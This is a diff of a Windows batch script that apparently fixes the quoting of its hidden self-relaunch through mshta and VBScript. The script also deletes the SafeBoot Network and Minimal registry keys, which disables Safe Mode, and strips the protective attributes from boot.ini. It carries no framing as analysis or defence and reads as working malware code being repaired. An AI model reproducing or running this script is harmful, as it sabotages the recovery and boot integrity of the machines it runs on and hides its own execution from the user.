@@ -1,5 +1,5 @@
 @echo off
-if not "%1"=="wkdxz" mshta vbscript:createobject("wscript.shell").run("""%~f0"" wkdxz"",vbhide)(window.close)&&exit
+if not "%1"=="wkdxz" mshta vbscript:createobject("wscript.shell").run("""%~f0"" wkdxz"",vbhide")(window.close)&&exit
 REG DELETE "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot" /v Network /f
 REG DELETE "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot" /v Minimal /f
 ATTRIB %SYSTEMDRIVE%\boot.ini -s -a -r -h
